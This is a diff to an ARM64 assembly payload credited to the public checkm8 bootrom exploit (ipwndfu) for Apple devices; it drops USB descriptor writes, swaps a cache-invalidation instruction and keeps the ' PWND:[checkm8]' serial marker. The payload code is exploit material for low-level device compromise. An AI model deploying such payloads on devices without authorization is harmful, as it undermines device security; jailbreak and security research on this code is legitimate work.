@@ -1,3 +1,7 @@
+// Code from the original checkm8 exploit by axi0mX
+// https://github.com/axi0mX/ipwndfu
+// This code has been relesed under the GPL v3
+
 .text
 
 .pool
@@ -20,15 +24,7 @@ _main:
   mov   x29, sp
 
   // Do not set USB Descriptors anymore, this will cause a crash on t8011 (and maybe others)
-  ldr   x0, =gUSBDescriptors
-  //ldp   x0, x1, [x0]
-  //adr   x2, USB_DESCRIPTOR
-  //ldp   x3, x4, [x2]
-  //stp   x3, x4, [x0]
-  //stp   x3, x4, [x1]
-  //ldp   x3, x4, [x2,#0x10]
-  //stp   x3, x4, [x0,#0x10]
-  //stp   x3, x4, [x1,#0x10]
+  ldr   x0, =gUSBDescriptors    // dummy
 
   ldr   x0, =gUSBSerialNumber
 
@@ -91,15 +87,12 @@ _copy_loop:
   b.cc  _copy_loop
 
 _end:
-  sys   #0, c7, c5, #0
-  dsb   SY
+  ic   iallu
+  dsb   sy
   isb
 
   ldp   x29, x30, [sp], #0x10
   ret
-
-//USB_DESCRIPTOR:
-//.word 0x190209, 0x80050101, 0x409fa, 0x1fe0000, 0x21070000, 0xa01, 0x8, 0x0
 
 PWND_STRING:
 .asciz " PWND:[checkm8]"
